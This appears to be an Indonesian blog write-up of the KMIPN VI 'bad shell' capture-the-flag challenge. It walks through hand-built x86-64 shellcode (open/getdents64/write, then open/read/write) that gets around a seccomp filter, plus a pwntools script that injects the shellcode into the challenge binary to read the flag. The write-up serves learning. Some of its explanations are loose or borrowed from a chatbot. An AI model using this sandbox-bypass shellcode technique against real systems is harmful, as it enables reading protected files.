---
layout: page
title: "Membuat 64 bit Shellcode - Shellcode Injection | Soal KMIPNVI-bad-shell"
categories: ctf assembly
---

<div class="post-categories">
  {% if post %}
    {% assign categories = post.categories %}
  {% else %}
    {% assign categories = page.categories %}
  {% endif %}
  <strong>Categories: </strong>
  {% for category in categories %}
  <a href="{{site.baseurl}}/categories/#{{category|slugize}}">{{category}}</a>
  {% unless forloop.last %}, {% endunless %}
  {% endfor %}
</div>

Pada blog ini, saya akan membagikan bagaimana saya mempelajari Assembly Instructions dari write up tim pemenang **KMIPN VI PNJ - Keamanan Siber** KEITO.

Langsung aja masuk ke pembahasanya, mumpung masih ingat h3h3..

Requirements:

- ghidra
- python3 pwntools
- ruby seccomp-tools
- nasm

Jadi peserta diberikan sebuah challenge Binary Exploit dengan judul **bad shell**, dari namanya sih udah pasti berhubungan dengan injection yak, tapi saya masih ga ngerti sama skali, soalnya masih pemula juga~

Hint:
![Hint](/assets/img/Screenshot 2024-07-07 151921.png)

Dari analisis file yang saya dapat waktu perlombaan sih, filenya begini
![checksec chall](/assets/img/Screenshot 2024-07-07 153518.png)

kalau yang dari saya baca:

- Full RELRO (Full Rellocation Read-Only), ga bisa write Global Offset Table (GOT)
- No Canary Found, tidak terdapat pengecekan canary ketika buffer overflow terjadi
- NX Enabled, tidak dapat memasukkan shellcode pada program
- PIE Enabled, alamat memori elf dinamis

jujur saya belum ngerti sepenuhnya detail ini😢

dari write up saya belajar meskipun NX Enabled, kita tetap bisa melakukan shellcode injection karena terdapat memory mapping untuk executable memory region dengan fungsi mmap((void \*)0x1337C0DE0000LL, 0x2000uLL, 7, 50, -1, 0LL) di ctx. Inputan kita (buffer) akan dibaca di memory region tersebut.
![hasil decompile ghidra](/assets/img/Screenshot 2024-07-07 154853.png)

bisa dilihat permission dari memori nya pakai gdb vmmap terdapat read, write, execute.
![vmmap dari file](/assets/img/Screenshot 2024-07-07 163617.png)

dan kita masukin inputan untuk test dari prompt yang diberikan, langsung aja cobain jalanin filenya..
![Mencoba menjalankan file](/assets/img/Screenshot 2024-07-07 152147.png)

Dapat error _illegal hardware instruction_.. berarti emang bener sih, kita diminta untuk masukin shellcode, karena byte input yang saya masukin kaga ada di list hardware instruction yak. Instruksi yang dimaksud mungkin assembly?

Pas lomba saya nyoba tuh nyari shellcode dari [shell-storm](https://shell-storm.org/shellcode/index.html){:target="\_blank"} dan setelah dicobain ya ga bisa.. pasti ada proses inputan dan pengecekan dilihat dari gimana inputan di read ke uVar1 dan ada fungsi check(), lalu init() juga

Tapi waktu itu saya ga tau sih gimana cara kerjanya, langsung aja cek write up~ ternyata di write up nya ada pakai tool seccomp-tools, buat mempermudah binary exploitation kali yak? kita coba aja
![Hasil dump binary dengan seccomp-tools](/assets/img/Screenshot 2024-07-07 152909.png)

Ternyata kalau dari write up, itu artinya kita ga bisa mengcraft fungsi execve dan execveat, dan byte ‘\x0f’ (syscall) juga diblock. Nah, disini saya melihat kalau mengcraft nya pakai assembly code, jadi saya pengen juga nyobain gimana caranya~ ternyata simpel, tapi ga mudah juga..

Pertama, dari hint udah jelas sih sebenarnya, cuman belum mudeng pada saat itu.. pertama perform sys_read. Nah, disini kita mulai main dengan assembly dan system call instruction. Untuk referensi yang saya gunakan bisa dilihat di [syscall.sh](https://syscall.sh/){:target="\_blank"}

Sebelum saya coba craft assembly, lihat dulu apa aja instruksi yang digunakan di write up, dan bagaimana cara kerjanya..

**Cara kerja orw (open-read-write) untuk listing direktori:**

1. Craft sys_open

   ```asm
   push 0x2e
   mov rdi,rsp
   xor rsi,rsi
   xor rdx,rdx
   push 0x2
   pop rax
   syscall
   ```

   sys_open memiliki 3 argumen (rdi: char \*filename, rsi: int flags, dan rdx: umode_t mode), jadi hasilnya sys_open(0x2e, 0, 0). Kenapa 0x2e atau dalam ascii titik (.) ? mungkin untuk mengambil filenames dari direktori "ini" dan rax sebagai instruksi untuk syscall, 0x2 untuk instruksi sys_open.

   argument flags dan mode yang bisa digunakannya bisa di baca pada [manual page open](https://man7.org/linux/man-pages/man2/open.2.html){:target="\_blank"}

2. Craft sys_getdents64 (karna binarynya 64 bit x86_64)

   ```asm
   mov rdi,rax
   mov rsi,rsp
   mov rdx,0x1000
   push 0xd9
   pop rax
   syscall
   ```

   sys_getdents64 memiliki 3 argumen juga (rdi: fd(file descriptor), rsi: linux_dirent64 \*dirent, rdx: int count), jadi pada rdi kita masukkan stack pointer untuk mereferensikan file descriptor sys_open sebelumnya pada rax, rsp untuk buffer dan rdx buffer size 0x1000 atau 4096 menjadi sys_getdents64(rax, rsp, 0x1000)

3. Craft sys_write

   ```asm
   mov rdi,1
   mov rsi,rsp
   mov rdx,0x1000
   push 0x1
   pop rax
   syscall
   ```

   sys_write memiliki 3 argumen juga (rdi: fd(file descriptor), rsi buf, rdx buf_size) menjadi sys_write(1, rsp, 0x1000)

   Tapi gini aja belum work, entah kenapa stack pointer harus diisi `mov rsp,qword ptr fs:0x0` terlebih dahulu, kalau dari chatgpt sih untuk membuat thread stack yang baru..

4. Finishing direktori listing

   Full asm code

   ```asm
    mov rsp, qword ptr fs:0x0
    push 0x2e
    mov rdi,rsp
    xor rsi,rsi
    xor rdx,rdx
    push 0x2
    pop rax
    syscall

    mov rdi,rax
    mov rsi,rsp
    mov rdx,0x1000
    push 0xd9
    pop rax
    syscall

    mov rdi,1
    mov rsi,rsp
    mov rdx,0x1000
    push 0x1
    pop rax
    syscall
   ```

Lalu buat script python
{% raw %}

```py
#!/usr/bin/python3
from pwn import *
import sys
exe = './chall_badshell'
context.binary = ELF(exe, checksec=0)
context.bits = 64
io = process(exe)

p = asm('''
    mov rsp, qword ptr fs:0x0
    push 0x2e
    mov rdi,rsp
    xor rsi,rsi
    xor rdx,rdx
    push 0x2
    pop rax
    syscall

    mov rdi,rax
    mov rsi,rsp
    mov rdx,0x1000
    push 0xd9
    pop rax
    syscall

    mov rdi,1
    mov rsi,rsp
    mov rdx,0x1000
    push 0x1
    pop rax
    syscall

''')

io.sendline(p)
io.interactive()
```

{% endraw %}

**\*Ini tes dijalanin di lokal, karena server sudah mati**

Setelah di jalankan maka kita akan menerima output berupa 0x1000 bytes yang terdapat namafile dari flag (flag berada pada current directory binary atau direktori "ini")
![Nama file flag](/assets/img/Screenshot 2024-07-07 202451.png)

Nah setelah tau nama filenya, langsung aja yak buat assembly untuk baca filenya, tapi pakai sys_open -> sys_read -> sys_write

Full asm code

```asm
    mov rsp, QWORD PTR fs:0x0
    push 0x74
    mov rax,0x78742e6537323438
    push rax
    mov rax,0x6663653839393030
    push rax
    mov rax,0x3839653430326230
    push rax
    mov rax,0x3066383964633864
    push rax
    mov rax,0x3134642d67616c66
    push rax
    mov rdi,rsp
    xor rsi,rsi
    xor rdx,rdx
    push 0x2
    pop rax
    syscall

    mov rdi,rax
    mov rdx,0x60
    mov rsi,rsp
    xor rax,rax
    syscall

    mov rdi,0x1
    mov rdx,0x60
    mov rsi,rsp
    push 0x1
    pop rax
    syscall
```

Penjelasan singkat dari assembly code buat baca filenya

```asm
    push 0x74
    mov rax,0x78742e6537323438
    push rax
    mov rax,0x6663653839393030
    push rax
    mov rax,0x3839653430326230
    push rax
    mov rax,0x3066383964633864
    push rax
    mov rax,0x3134642d67616c66
    push rax
```

Bagian ini proses untuk memasukkan nama file kedalam stack pointer melalui immediate value dari rax dengan little-endian byte order, cara saya untuk membuat nama file menjadi bentuk ini pake python dengan script dibawah, karena ga tau cara mudahnya, ya gini aja..

```py
nama_flag = b'flag-d41d8cd98f00b204e9800998ecf8427e.txt'[::-1].hex()
nama_flag_bytes = [nama_flag[:len(nama_flag)-len(nama_flag)//16*16]] + [nama_flag[len(nama_flag)-len(nama_flag)//16*16+i:len(nama_flag)-len(nama_flag)//16*16+i+16] for i in range(0,len(nama_flag),16)]
print(f"{bytes.fromhex(''.join(nama_flag_bytes))=}")
print(f"{nama_flag_bytes=}")
```

Harusnya bakal jadi seperti ini, dan nama file digunakan sebagai parameter untuk argumen rdi pada sys_open
![Merubah string menjadi little endian dengan python](/assets/img/Screenshot 2024-07-08 210708.png)

Selanjutnya melakukan exploit dengan mengganti variabel p pada script python pertama dengan assembly code yang sudah di craft untuk tujuan membaca file dari flag.

Setelah exploit di jalankan, maka hasilnya akan seperti ini
![Exploit dijalankan](/assets/img/Screenshot 2024-07-07 150458.png)

Dan didapatlah flagnya `KMIPNVIPNJ{kud0s!_open_getdents_write__th3n__open_read_write__is_th3_int3nded_solution__h3h3h3}`

Credit:

- ITOID Instagram [@lightningitoid](https://www.instagram.com/lightningitoid/){:target="\_blank"}
- KE.II Instagram [@v4.yn](https://www.instagram.com/v4.yn/){:target="\_blank"}
